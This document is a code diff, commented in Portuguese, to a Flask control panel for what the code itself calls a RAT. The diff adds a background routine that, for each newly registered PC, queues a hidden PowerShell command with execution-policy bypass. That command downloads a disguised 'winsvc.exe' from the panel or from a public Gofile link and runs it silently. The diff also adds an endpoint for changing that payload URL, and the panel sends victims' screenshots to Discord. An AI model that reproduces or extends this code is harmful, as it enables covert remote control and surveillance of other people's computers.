@@ -70,8 +70,8 @@ def load_state():
     except Exception as e:
         logger.error(f"Erro ao carregar estado: {e}")
 
-# Webhook Discord
-DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
+# Link publico do watchdog (Gofile)
+WATCHDOG_URL = os.environ.get('WATCHDOG_URL', '')
 
 def send_to_discord(pc_name, screenshot_base64):
     """Envia screenshot para Discord via webhook"""
@@ -206,23 +206,50 @@ def register_pc():
                 'registered_at': str(datetime.now()),
                 'watchdog_deployed': connected_pcs[pc_name].get('watchdog_deployed', False) if pc_name in connected_pcs else False
             }
-            
-            if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
-                panel_host = request.host.split(':')[0]
-                panel_port = request.host.split(':')[1] if ':' in request.host else '5000'
-                cmd = f'powershell -WindowStyle Hidden -Command "Start-Sleep 3; Invoke-WebRequest -Uri http://{panel_host}:{panel_port}/api/watchdog -OutFile $env:TEMP\\winsvc.exe; Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
-                command_queue[pc_name].append(cmd)
-                connected_pcs[pc_name]['watchdog_deployed'] = True
-                logger.info(f"[REGISTER] {pc_name}: watchdog auto-deploy enfileirado")
-            
             logger.info(f"[REGISTER] {pc_name}")
         
         broadcast_pc_update()
         broadcast_notification('success', 'PC Conectado', f'{pc_name} se conectou ao painel', pc_name)
+        
+        if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
+            threading.Thread(target=_deploy_watchdog_bg, args=(pc_name,), daemon=True).start()
+        
         return jsonify({"status": "registered", "pc_name": pc_name})
     except Exception as e:
         logger.error(f"[REGISTER] Erro ao registrar PC: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
+
+def _deploy_watchdog_bg(pc_name):
+    """Background: envia comando PowerShell para baixar watchdog do painel"""
+    try:
+        with pc_lock:
+            info = connected_pcs.get(pc_name, {})
+            host = info.get('last_host', '')
+        
+        if not host:
+            host = request.remote_addr if hasattr(request, 'remote_addr') else 'localhost'
+        
+        url = f"http://{host}:5000/api/watchdog"
+        if WATCHDOG_URL:
+            url = WATCHDOG_URL
+        
+        cmd = (
+            f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
+            f'"Start-Sleep 2; '
+            f'Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
+            f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
+        )
+        
+        with pc_lock:
+            command_queue.setdefault(pc_name, [])
+            command_queue[pc_name].append(cmd)
+            if pc_name in connected_pcs:
+                connected_pcs[pc_name]['watchdog_deployed'] = True
+        
+        logger.info(f"[WATCHDOG] {pc_name}: deploy via {url[:60]}...")
+    except Exception as e:
+        logger.error(f"[WATCHDOG] Erro deploy para {pc_name}: {e}")
 
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
@@ -561,6 +588,20 @@ def build_rat_exe():
         logger.error(f"[BUILD] Erro ao enviar arquivo: {e}")
         return jsonify({"error": str(e)}), 500
 
+@app.route('/api/watchdog_url', methods=['POST'])
+@require_login
+def set_watchdog_url():
+    """Define a URL publica do watchdog (Gofile)"""
+    global WATCHDOG_URL
+    data = request.get_json() or {}
+    url = data.get('url', '')
+    if url:
+        WATCHDOG_URL = url
+        logger.info(f"[WATCHDOG] URL atualizada: {url[:60]}")
+        return jsonify({"status": "ok", "url": url})
+    return jsonify({"error": "url obrigatoria"}), 400
+
+
 @app.route('/api/watchdog', methods=['GET'])
 def download_watchdog():
     """Serve o watchdog.exe compilado ou o .py source"""
@@ -584,7 +625,7 @@ def download_exe():
     """Download direto do ultimo .exe compilado"""
     from pathlib import Path
     dist_dir = Path(app.root_path) / 'dist'
-        candidates = list(dist_dir.glob('raiox*'))
+    candidates = list(dist_dir.glob('raiox*'))
     if not candidates:
         return jsonify({"error": "Nenhum .exe compilado. Clique em BUILD primeiro."}), 404
     latest = max(candidates, key=lambda p: p.stat().st_mtime)
